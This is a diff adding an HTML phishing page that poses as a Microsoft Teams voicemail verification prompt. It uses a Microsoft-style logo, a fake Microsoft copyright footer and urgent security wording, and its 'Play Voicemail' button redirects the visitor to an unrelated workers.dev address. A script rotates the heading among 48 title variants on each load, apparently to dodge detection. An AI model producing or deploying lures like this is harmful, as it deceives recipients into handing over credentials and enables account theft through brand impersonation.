@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dynamic Voicemail Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      width: 350px;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    h2 {
+      font-size: 24px;
+      color: #333;
+      margin-bottom: 15px;
+    }
+
+    p {
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #4e5ffa;
+      border: none;
+      color: #fff;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #8091f2;
+    }
+
+    .voice-wave {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 20px;
+    }
+
+    .voice-wave span {
+      display: block;
+      width: 6px;
+      height: 20px;
+      background-color: #4e5ffa;
+      margin: 0 2px;
+      border-radius: 5px;
+      animation: wave 1s infinite ease-in-out;
+    }
+
+    .voice-wave span:nth-child(2) {
+      animation-delay: 0.1s;
+    }
+
+    .voice-wave span:nth-child(3) {
+      animation-delay: 0.2s;
+    }
+
+    .voice-wave span:nth-child(4) {
+      animation-delay: 0.3s;
+    }
+
+    .voice-wave span:nth-child(5) {
+      animation-delay: 0.4s;
+    }
+
+    @keyframes wave {
+      0%, 100% {
+        transform: scaleY(1);
+      }
+      50% {
+        transform: scaleY(1.5);
+      }
+    }
+
+    .footer-text {
+      font-size: 11px;
+      color: #666;
+      margin-top: 20px;
+      text-align: center;
+      line-height: 1.4;
+    }
+
+    .footer-text a {
+      color: #0000EE;
+      text-decoration: none;
+    }
+
+    .footer-text a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-text small {
+      font-size: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img id="signatureImage" src="https://th.bing.com/th/id/R.1e603901f6f3cb850a476d65e379f4b6?rik=1uQnKz3c6wKQ9g&amp;pid=ImgRaw&amp;r=0" style="width: 250px;" alt="Company Logo">
+    
+    <h2 id="dynamicTitle">Voicemail Verification</h2>
+    
+    <p>Your new voicemail has arrived. To protect your security, please verify and play this voicemail through Microsoft Teams®. Simply click the button below to begin playback and ensure the message is authentic.</p>
+
+    <!-- Play Button -->
+    <button onclick="redirectToVoicemail()">Play Voicemail in Microsoft Teams®</button>
+
+    <!-- Animated Voice Wave Effect -->
+    <div class="voice-wave">
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+
+    <!-- Footer with Microsoft Content -->
+    <div class="footer-text">
+      <small>
+        Protected by Microsoft Teams® | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>
+        <br>© 2024 Microsoft Corporation. All rights reserved.
+      </small>
+    </div>
+  </div>
+
+  <script>
+    function redirectToVoicemail() {
+      // Redirection logic for Voicemail playback
+      window.location.href = "https://b408779f.39c4d582985ada7e23d16774.workers.dev/";
+    }
+
+    // Array of up to 48 variations for Voicemail Verification
+    const titleVariations = [
+      "Voicemail Confirmation",
+      "Voicemail Playback",
+      "Verify Voicemail",
+      "Access Voicemail",
+      "Play New Voicemail",
+      "Voicemail Access",
+      "Check Voicemail",
+      "New Voicemail Notification",
+      "Voicemail Pending",
+      "Voicemail Security Verification",
+      "Authenticate Voicemail",
+      "Voicemail Audio Verification",
+      "Verify Message",
+      "Play Voicemail",
+      "New Voicemail Arrived",
+      "Your Voicemail is Here",
+      "Voicemail Verification Required",
+      "Pending Voicemail Verification",
+      "Voicemail Review",
+      "Secure Voicemail Playback",
+      "Play Secured Voicemail",
+      "New Message Available",
+      "Voicemail Playback Access",
+      "Voicemail Received",
+      "Message Authentication Required",
+      "Access New Voicemail",
+      "Voicemail Playback Pending",
+      "Message Verification Required",
+      "New Audio Message",
+      "Voicemail Action Needed",
+      "Verify Your Voicemail",
+      "Voicemail Notification",
+      "Voicemail Security Check",
+      "Voicemail Listening Required",
+      "Voicemail Playback Request",
+      "Play Your New Message",
+      "New Voicemail Waiting",
+      "Voicemail Authentication",
+      "Message Playback",
+      "Voicemail Alert",
+      "New Secure Voicemail",
+      "Check New Voicemail",
+      "Voicemail Review Needed",
+      "Play Your Secure Voicemail",
+      "Listen to Voicemail",
+      "Secure Message Playback",
+      "Authentication Needed for Voicemail",
+      "Access New Message"
+    ];
+
+    // Randomize the title on page load
+    document.getElementById("dynamicTitle").textContent = titleVariations[Math.floor(Math.random() * titleVariations.length)];
+  </script>
+
+</body>
+
+</html>
